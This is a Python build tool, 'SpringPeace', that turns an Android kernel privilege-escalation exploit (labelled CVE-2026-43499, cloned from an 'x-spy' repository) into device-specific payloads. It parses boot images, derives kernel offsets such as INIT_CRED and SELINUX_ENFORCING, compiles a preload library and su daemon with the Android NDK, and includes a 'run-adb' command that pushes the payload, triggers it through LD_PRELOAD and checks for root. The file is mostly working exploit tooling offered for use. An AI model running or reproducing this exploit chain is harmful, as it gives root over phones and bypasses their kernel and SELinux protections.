#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
"""SpringPeace one-click builder for x-spy CVE-2026-43499 payloads.

This wrapper keeps the exploit source in the upstream x-spy repository and
builds target-specific payload candidates from a boot.img plus a physical-load
profile. It is intended to be packaged with PyInstaller for a Windows .exe.
"""

from __future__ import annotations

import argparse
import contextlib
import hashlib
import json
import os
import io
import runpy
from types import SimpleNamespace
import re
import shutil
import struct
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, Sequence


def configure_console_encoding() -> None:
    if os.name == "nt":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleOutputCP(65001)
            ctypes.windll.kernel32.SetConsoleCP(65001)
        except Exception:
            pass
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass


SCRIPT_DIR = Path(getattr(sys, "_MEIPASS", Path(__file__).resolve().parent))
DEFAULT_XSPY = "https://github.com/x-spy/CVE-2026-43499-popsicle.git"
DEFAULT_LOADS = [
    "0x80000000",
    "0x88000000",
    "0x90000000",
    "0x98000000",
    "0xa0000000",
    "0xa8000000",
    "0xb0000000",
    "0xb8000000",
    "0xc0000000",
    "0xc7800000",
]

SCOPE_NOTICE_VI = (
    'Lưu ý: bản hiện tại mới test trên Xiaomi và OnePlus/OPPO kernel 6.12.x chạy chip Snapdragon. Thiết'
    ' bị khác có thể không chạy đúng và có thể reboot.'
)
SCOPE_NOTICE_EN = (
    'Note: this build has only been tested on Xiaomi and OnePlus/OPPO 6.12.x kernels running Sna'
    'pdragon chipsets. Other devices may not work and may reboot.'
)
TEMP_ROOT_NOTICE_VI = (
    'Root kiểu này không ổn định, phù hợp cho mục đích tạm thời như thay file vào app, thao tác nhanh, '
    'unlock bootloader hoặc kiểm thử. Không nên dùng lâu dài; reboot sẽ mất trạng thái.'
)
TEMP_ROOT_NOTICE_EN = (
    'This root style is not stable. Use it for temporary tasks such as replacing app files, quick changes, '
    'bootloader-unlock workflows, or testing. It is not for long-term daily use; reboot clears the state.'
)
SCOPE_NOTICE = SCOPE_NOTICE_VI + "\n" + SCOPE_NOTICE_EN + "\n" + TEMP_ROOT_NOTICE_VI + "\n" + TEMP_ROOT_NOTICE_EN

def print_scope_notice() -> None:
    print(SCOPE_NOTICE)



@dataclass
class BootInfo:
    path: Path
    sha256: str
    size: int
    header_version: int
    header_size: int
    kernel_offset: int
    kernel_size: int
    kernel_sha256: str
    kernel_kind: str
    text_offset: int | None = None
    image_size: int | None = None
    image_flags: int | None = None
    linux_version: str | None = None


def die(message: str, code: int = 2) -> None:
    print(f"[!] {message}", file=sys.stderr)
    raise SystemExit(code)


def log(message: str) -> None:
    print(f"[*] {message}")


def ok(message: str) -> None:
    print(f"[+] {message}")


def hidden_subprocess_kwargs() -> dict:
    kwargs: dict = {}
    if os.name == "nt":
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            kwargs["startupinfo"] = si
        except Exception:
            pass
    return kwargs


def run(cmd: Sequence[str | Path], cwd: Path | None = None, env: dict[str, str] | None = None,
        check: bool = True) -> subprocess.CompletedProcess[str]:
    shown = " ".join(str(x) for x in cmd)
    try:
        p = subprocess.run(
            [str(x) for x in cmd],
            cwd=str(cwd) if cwd else None,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
            **hidden_subprocess_kwargs(),
        )
    except FileNotFoundError as exc:
        raise RuntimeError(f"command launch failed: {shown}\nmissing executable: {cmd[0]}\n{exc}") from exc
    if check and p.returncode != 0:
        raise RuntimeError(f"command failed rc={p.returncode}: {shown}\n{p.stdout}")
    return p


def run_python_script_inprocess(script: Path, argv: Sequence[str | Path], cwd: Path | None = None,
                                env: dict[str, str] | None = None) -> SimpleNamespace:
    """Run a Python script inside this interpreter and capture stdout/stderr.

    This lets the windowed one-file GUI execute x-spy generate_target.py without
    depending on python.exe being installed separately.
    """
    old_argv = sys.argv[:]
    old_cwd = Path.cwd()
    old_env: dict[str, str | None] = {}
    buf = io.StringIO()
    if env:
        for key, value in env.items():
            old_env[key] = os.environ.get(key)
            os.environ[key] = value
    try:
        if cwd:
            os.chdir(cwd)
        sys.argv = [str(script), *[str(a) for a in argv]]
        rc = 0
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
            try:
                runpy.run_path(str(script), run_name="__main__")
            except SystemExit as exc:
                code = exc.code
                if code is None:
                    rc = 0
                elif isinstance(code, int):
                    rc = code
                else:
                    rc = 1
                    print(code)
    except BaseException as exc:
        rc = 1
        print(f"{type(exc).__name__}: {exc}", file=buf)
    finally:
        sys.argv = old_argv
        os.chdir(old_cwd)
        if env:
            for key, value in old_env.items():
                if value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = value
    return SimpleNamespace(returncode=rc, stdout=buf.getvalue())


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for block in iter(lambda: f.read(1024 * 1024), b""):
            h.update(block)
    return h.hexdigest()


def parse_int(value: str | int) -> int:
    if isinstance(value, int):
        return value
    return int(str(value).strip(), 0)


def hx(value: int) -> str:
    return f"0x{value:x}"


def align_up(value: int, alignment: int) -> int:
    return (value + alignment - 1) & -alignment


def read_u32(data: bytes, off: int) -> int:
    return struct.unpack_from("<I", data, off)[0]


def read_u64(data: bytes, off: int) -> int:
    return struct.unpack_from("<Q", data, off)[0]


def inspect_boot(path: Path) -> BootInfo:
    data = path.read_bytes()
    if len(data) < 4096 or data[:8] != b"ANDROID!":
        die(f"not an Android boot v3/v4 image: {path}")
    kernel_size = read_u32(data, 8)
    header_size = read_u32(data, 20)
    header_version = read_u32(data, 40)
    kernel_offset = align_up(header_size, 4096)
    kernel = data[kernel_offset:kernel_offset + kernel_size]
    if len(kernel) != kernel_size:
        die("boot header kernel range is outside the file")
    kind = "unknown"
    text_offset = image_size = image_flags = None
    if len(kernel) >= 0x40 and kernel[0x38:0x3C] == b"ARM\x64":
        kind = "raw-arm64-image"
        text_offset = read_u64(kernel, 8)
        image_size = read_u64(kernel, 16)
        image_flags = read_u64(kernel, 24)
    elif kernel[:4] == b"\x02\x21\x4c\x18":
        kind = "lz4-legacy"
    version = None
    m = re.search(rb"Linux version [^\x00\n]{1,220}", kernel)
    if m:
        version = m.group(0).decode("latin-1", "replace")
    return BootInfo(
        path=path,
        sha256=sha256_file(path),
        size=len(data),
        header_version=header_version,
        header_size=header_size,
        kernel_offset=kernel_offset,
        kernel_size=kernel_size,
        kernel_sha256=hashlib.sha256(kernel).hexdigest(),
        kernel_kind=kind,
        text_offset=text_offset,
        image_size=image_size,
        image_flags=image_flags,
        linux_version=version,
    )


def lz4_legacy_decompress(blob: bytes) -> bytes:
    try:
        import lz4.block  # type: ignore
    except Exception as exc:  # pragma: no cover
        die(f"install Python package lz4 for LZ4 boot kernels: {exc}")
    if blob[:4] != b"\x02\x21\x4c\x18":
        die("kernel is not LZ4 legacy format")
    pos = 4
    out = bytearray()
    while pos + 4 <= len(blob):
        block_size = read_u32(blob, pos)
        pos += 4
        if block_size == 0:
            break
        block = blob[pos:pos + block_size]
        pos += block_size
        if len(block) != block_size:
            die("truncated LZ4 legacy block")
        last_error = None
        for limit in (8, 16, 32, 64, 128):
            try:
                out.extend(lz4.block.decompress(block, uncompressed_size=limit * 1024 * 1024))
                last_error = None
                break
            except Exception as exc:
                last_error = exc
        if last_error is not None:
            raise RuntimeError(f"LZ4 block decode failed: {last_error}")
    return bytes(out)


def prepare_boot_for_xspy(boot: Path, out_dir: Path) -> tuple[Path, BootInfo, str]:
    info = inspect_boot(boot)
    if info.kernel_kind == "raw-arm64-image":
        return boot, info, "raw"
    if info.kernel_kind != "lz4-legacy":
        die(f"kernel payload kind needs a preparer: {info.kernel_kind}")
    data = boot.read_bytes()
    kernel = data[info.kernel_offset:info.kernel_offset + info.kernel_size]
    raw = lz4_legacy_decompress(kernel)
    if len(raw) < 0x40 or raw[0x38:0x3C] != b"ARM\x64":
        die("LZ4 decoded data does not look like an arm64 Image")
    fake = bytearray(data[:info.kernel_offset])
    struct.pack_into("<I", fake, 8, len(raw))
    fake.extend(raw)
    out_path = out_dir / (boot.stem + ".xspy-uncompressed-boot.img")
    out_path.write_bytes(bytes(fake))
    return out_path, inspect_boot(out_path), "lz4->raw"


def load_presets() -> dict:
    presets_path = SCRIPT_DIR / "presets.json"
    if not presets_path.exists():
        return {}
    return json.loads(presets_path.read_text(encoding="utf-8-sig"))


def resolve_ndk(ndk: str | None) -> Path:
    candidates: list[Path] = []
    if ndk:
        candidates.append(Path(ndk))
    for env_name in ("ANDROID_NDK_HOME", "ANDROID_NDK_ROOT", "NDK_ROOT"):
        if os.environ.get(env_name):
            candidates.append(Path(os.environ[env_name]))
    candidates.append(Path(r"D:\Root\android-ndk-r29-windows\android-ndk-r29"))
    local = os.environ.get("LOCALAPPDATA")
    if local:
        ndk_root = Path(local) / "Android" / "Sdk" / "ndk"
        if ndk_root.exists():
            candidates.extend(sorted(ndk_root.iterdir(), reverse=True))
    for c in candidates:
        if (c / "toolchains" / "llvm" / "prebuilt").exists():
            return c
    die("NDK path not found; pass --ndk")


def toolchain_dir(ndk: Path) -> Path:
    prebuilt = ndk / "toolchains" / "llvm" / "prebuilt"
    for name in ("windows-x86_64", "linux-x86_64", "darwin-x86_64", "darwin-aarch64"):
        d = prebuilt / name
        if d.exists():
            return d
    found = list(prebuilt.glob("*"))
    if found:
        return found[0]
    die(f"no LLVM prebuilt directory under {prebuilt}")


def resolve_clang(ndk: Path, api: int) -> tuple[Path, Path, Path]:
    tc = toolchain_dir(ndk)
    bin_dir = tc / "bin"
    if os.name == "nt":
        # Use clang.exe directly to avoid visible aarch64-*-clang.cmd windows.
        clang = bin_dir / "clang.exe"
        if not clang.exists():
            clang = bin_dir / f"aarch64-linux-android{api}-clang.cmd"
    else:
        clang = bin_dir / f"aarch64-linux-android{api}-clang"
        if not clang.exists():
            clang = bin_dir / "clang"
    objdump = bin_dir / ("llvm-objdump.exe" if os.name == "nt" else "llvm-objdump")
    sysroot = tc / "sysroot"
    if not clang.exists() or not objdump.exists() or not sysroot.exists():
        die(f"NDK clang/objdump/sysroot missing under {tc}")
    return clang, objdump, sysroot


def ensure_xspy(repo: Path, clone_url: str = DEFAULT_XSPY) -> None:
    if repo.exists() and (repo / "generate_target.py").exists() and (repo / "source" / "src").exists():
        return
    repo.parent.mkdir(parents=True, exist_ok=True)
    run(["git", "clone", clone_url, repo])


def apply_compat_patch(repo: Path) -> str:
    patch = SCRIPT_DIR / "patches" / "xspy-generate-target-compat.patch"
    gen_path = repo / "generate_target.py"
    text = gen_path.read_text(encoding="utf-8", errors="replace") if gen_path.exists() else ""
    if "O_BINARY" in text and "select_bridge" in text and 'offsets_for("kallsyms_num_syms")' in text:
        return "already present"
    if not patch.exists():
        return "missing patch file"
    git_exe = shutil.which("git")
    if not git_exe:
        return "not applied; git is not in PATH and bundled source is not pre-patched"
    check = run([git_exe, "apply", "--check", patch], cwd=repo, check=False)
    if check.returncode == 0:
        run([git_exe, "apply", patch], cwd=repo)
        return "applied"
    text = gen_path.read_text(encoding="utf-8", errors="replace") if gen_path.exists() else ""
    if "O_BINARY" in text and "select_bridge" in text and 'offsets_for("kallsyms_num_syms")' in text:
        return "already present"
    return "patch skipped: " + check.stdout.splitlines()[-1] if check.stdout else "patch skipped"


def write_json(path: Path, value: dict) -> None:
    path.write_text(json.dumps(value, indent=2, sort_keys=True), encoding="utf-8")


def read_macros(path: Path) -> dict[str, str]:
    text = path.read_text(encoding="utf-8", errors="replace")
    return dict(re.findall(r"^#define\s+(\w+)\s+([^\s]+)", text, re.M))


def patch_load_in_target(path: Path, load: int) -> None:
    text = path.read_text(encoding="utf-8")
    text = re.sub(
        r"#define\s+P0_KERNEL_PHYS_LOAD\s+0x[0-9a-fA-F]+ULL",
        f"#define P0_KERNEL_PHYS_LOAD 0x{load:x}ULL",
        text,
    )
    path.write_text(text, encoding="utf-8")


def build_payload(repo: Path, clang: Path, sysroot: Path, api: int) -> tuple[int, str, Path]:
    source = repo / "source"
    build = source / "build"
    if build.exists():
        shutil.rmtree(build)
    (build / "embed").mkdir(parents=True, exist_ok=True)
    (build / "bin").mkdir(parents=True, exist_ok=True)
    common = [f"--target=aarch64-linux-android{api}", f"--sysroot={sysroot}"]
    macro = "-DTARGET_CONFIG_H=\"target.h\""
    su = [
        clang, *common, "-fPIE", "-pie", "-O2", "-g0", "-Wall", "-Wextra", "-Isrc", macro,
        "src/su_daemon.c", "-fuse-ld=lld", "-Wl,-dynamic-linker,/system/bin/linker64",
        "-o", "build/embed/su_daemon_aarch64_pie",
    ]
    out = ""
    p = run(su, cwd=source, check=False)
    out += f"== su_daemon rc={p.returncode} ==\n{p.stdout}\n"
    if p.returncode != 0:
        return p.returncode, out, build / "bin" / "preload.so"
    preload = [
        clang, *common, "-fPIC", "-O2", "-g0", "-Wall", "-Wextra",
        "-Wno-unused-parameter", "-Wno-sign-compare", "-Wno-unused-function",
        "-Isrc", macro,
        "src/main.c", "src/util.c", "src/slide.c", "src/fops.c", "src/pipe.c",
        "src/preload.c", "src/su_blob.S", "-fuse-ld=lld", "-shared", "-o",
        "build/bin/preload.so", "-pthread",
    ]
    p = run(preload, cwd=source, check=False)
    out += f"== preload rc={p.returncode} ==\n{p.stdout}\n"
    return p.returncode, out, build / "bin" / "preload.so"


def route_layout_ok(macros: dict[str, str], nfds: int = 320) -> bool:
    shift = parse_int(macros.get("PSELECT_WAITER_WORD_SHIFT", "0"))
    words_per_set = (nfds + 63) // 64
    # x-spy places the farthest waiter field at qword 12.
    return (shift + 12) < (3 * words_per_set)


def parse_load_list(text: str | None, preset: dict | None) -> list[int]:
    if text:
        return [parse_int(x) for x in re.split(r"[,;\s]+", text) if x.strip()]
    if preset:
        if preset.get("preferred_load_after_validation"):
            return [parse_int(preset["preferred_load_after_validation"])]
        if preset.get("candidate_loads"):
            return [parse_int(x) for x in preset["candidate_loads"]]
    return [parse_int(x) for x in DEFAULT_LOADS]


def cmd_info(args: argparse.Namespace) -> int:
    print_scope_notice()
    info = inspect_boot(Path(args.boot))
    print(json.dumps(info.__dict__ | {"path": str(info.path)}, indent=2, default=str))
    return 0


def cmd_make(args: argparse.Namespace) -> int:
    print_scope_notice()
    out_dir = Path(args.out).resolve()
    out_dir.mkdir(parents=True, exist_ok=True)
    presets = load_presets()
    preset = presets.get(args.preset, {}) if args.preset else {}
    xspy = Path(args.xspy_repo or (out_dir / "_xspy")).resolve()
    ensure_xspy(xspy, args.xspy_url)
    patch_state = "not requested"
    if args.compat_patch:
        patch_state = apply_compat_patch(xspy)
        log(f"x-spy compat patch: {patch_state}")
    ndk = resolve_ndk(args.ndk)
    clang, objdump, sysroot = resolve_clang(ndk, args.api)
    if args.llvm_objdump:
        objdump = Path(args.llvm_objdump)
    prepared_boot, boot_info, prep = prepare_boot_for_xspy(Path(args.boot), out_dir)
    loads = parse_load_list(args.p0_kernel_phys_load, preset)
    p0_phys = parse_int(args.p0_phys_offset or preset.get("p0_phys_offset", "0x80000000"))
    manifest: dict = {
        "created_at": time.strftime("%Y-%m-%d %H:%M:%S %z"),
        "scope_notice_vi": SCOPE_NOTICE_VI,
        "scope_notice_en": SCOPE_NOTICE_EN,
        "temporary_root_notice_vi": TEMP_ROOT_NOTICE_VI,
        "temporary_root_notice_en": TEMP_ROOT_NOTICE_EN,
        "preset": args.preset,
        "xspy_repo": str(xspy),
        "xspy_patch": patch_state,
        "boot": boot_info.__dict__ | {"path": str(boot_info.path)},
        "prepared_boot": str(prepared_boot),
        "preparation": prep,
        "ndk": str(ndk),
        "api": args.api,
        "candidates": [],
    }
    first_target: str | None = None
    for load in loads:
        tag = f"{load:08x}"
        profile = {"p0_phys_offset": hx(p0_phys), "p0_kernel_phys_load": hx(load)}
        profile_path = out_dir / f"profile_{tag}.json"
        write_json(profile_path, profile)
        target_h = xspy / "source" / "src" / "target.h"
        py_env = os.environ.copy()
        py_env["PYTHONUTF8"] = "1"
        py_env["PYTHONIOENCODING"] = "utf-8"
        gen_args = [
            "--boot", prepared_boot,
            "--profile", profile_path, "-o", target_h, "--llvm-objdump", objdump,
        ]
        if args.python == "INPROCESS" or (args.python is None and getattr(sys, "frozen", False)):
            gen = run_python_script_inprocess(xspy / "generate_target.py", gen_args, cwd=xspy, env=py_env)
        else:
            py_exe = args.python or sys.executable
            gen = run([py_exe, xspy / "generate_target.py", *gen_args], cwd=xspy, env=py_env, check=False)
        cand: dict = {
            "p0_phys_offset": hx(p0_phys),
            "p0_kernel_phys_load": hx(load),
            "profile": str(profile_path),
            "generate_rc": gen.returncode,
            "generate_log": gen.stdout,
        }
        if gen.returncode == 0:
            macros = read_macros(target_h)
            cand["macros"] = {k: macros.get(k) for k in [
                "KIMAGE_TEXT_BASE", "P0_PAGE_OFFSET", "P0_PHYS_OFFSET", "P0_KERNEL_PHYS_LOAD",
                "PSELECT_WAITER_WORD_SHIFT", "INIT_TASK", "INIT_CRED", "ENTRY_TASK",
                "PER_CPU_OFFSET", "ROOT_TASK_GROUP", "SELINUX_ENFORCING",
                "TASK_REAL_CRED_OFF", "TASK_CRED_OFF",
            ]}
            cand["layout_ok"] = route_layout_ok(macros)
            if not first_target:
                first_target = target_h.read_text(encoding="utf-8")
            rc, build_log, payload = build_payload(xspy, clang, sysroot, args.api)
            cand["build_rc"] = rc
            cand["build_log"] = build_log
            if rc == 0 and payload.exists():
                so_out = out_dir / f"payload_p0load_{tag}.so"
                h_out = out_dir / f"target_p0load_{tag}.h"
                shutil.copy2(payload, so_out)
                shutil.copy2(target_h, h_out)
                cand["payload"] = str(so_out)
                cand["target_h"] = str(h_out)
                cand["sha256"] = sha256_file(so_out)
                cand["size"] = so_out.stat().st_size
                ok(f"built {so_out.name} sha256={cand['sha256']}")
            else:
                log(f"build failed for p0load={hx(load)}")
        else:
            log(f"target generation failed for p0load={hx(load)}")
        manifest["candidates"].append(cand)
    if first_target:
        # Leave the last generated target in x-spy, but keep manifest copies in out_dir.
        pass
    manifest_path = out_dir / "manifest.json"
    write_json(manifest_path, manifest)
    ok(f"manifest: {manifest_path}")
    return 0


def cmd_run_adb(args: argparse.Namespace) -> int:
    adb = Path(args.adb)
    payload = Path(args.payload)
    remote = args.remote
    for cmd in (
        [adb, "push", payload, remote],
        [adb, "shell", "chmod", "0644", remote],
        [adb, "shell", f"LD_PRELOAD={remote} /system/bin/true"],
        [adb, "shell", "/data/local/tmp/su", "-c", "id"],
    ):
        p = run(cmd, check=False)
        print(p.stdout, end="")
        if p.returncode != 0:
            return p.returncode
    return 0


def cmd_about(args: argparse.Namespace) -> int:
    print("SpringPeace One-Click Builder")
    print_scope_notice()
    return 0


def make_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="SpringPeace boot.img -> x-spy payload builder",
        epilog=SCOPE_NOTICE,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    about = sub.add_parser("about", help="print build scope notice")
    about.set_defaults(func=cmd_about)

    info = sub.add_parser("info", help="print boot.img metadata")
    info.add_argument("--boot", required=True)
    info.set_defaults(func=cmd_info)

    make = sub.add_parser("make", help="generate target.h and payload candidate(s)")
    make.add_argument("--boot", required=True)
    make.add_argument("--out", default="out/springpeace")
    make.add_argument("--preset", default=None)
    make.add_argument("--xspy-repo", default=None)
    make.add_argument("--xspy-url", default=DEFAULT_XSPY)
    make.add_argument("--compat-patch", action=argparse.BooleanOptionalAction, default=True)
    make.add_argument("--ndk", default=None)
    make.add_argument("--api", type=int, default=35)
    make.add_argument("--llvm-objdump", default=None)
    make.add_argument("--python", default=None, help="Python interpreter for x-spy generate_target.py; exe builds default to python on PATH")
    make.add_argument("--p0-phys-offset", default=None)
    make.add_argument("--p0-kernel-phys-load", default=None,
                      help="single value or comma-separated candidate list; default comes from preset")
    make.set_defaults(func=cmd_make)

    adb = sub.add_parser("run-adb", help="push and execute a built payload")
    adb.add_argument("--adb", default=r"D:\Root\platform-tools-latest-windows\platform-tools\adb.exe")
    adb.add_argument("--payload", required=True)
    adb.add_argument("--remote", default="/data/local/tmp/preload.so")
    adb.set_defaults(func=cmd_run_adb)
    return p


def should_pause_on_exit(argv: list[str] | None) -> bool:
    if os.environ.get("SPRINGPEACE_NO_PAUSE") == "1":
        return False
    if argv is not None:
        return False
    try:
        return bool(sys.stdin and sys.stdin.isatty())
    except Exception:
        return False


def pause_on_exit(argv: list[str] | None) -> None:
    if os.name == "nt" and should_pause_on_exit(argv):
        try:
            input("\nPress Enter to exit / Nhan Enter de thoat...")
        except (EOFError, RuntimeError):
            pass


def main(argv: list[str] | None = None) -> int:
    configure_console_encoding()
    parser = make_parser()
    effective_argv = sys.argv[1:] if argv is None else argv
    if len(effective_argv) == 0:
        print("SpringPeace One-Click Builder")
        print_scope_notice()
        print()
        parser.print_help()
        pause_on_exit(argv)
        return 0
    args = parser.parse_args(argv)
    try:
        return int(args.func(args))
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        pause_on_exit(argv)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
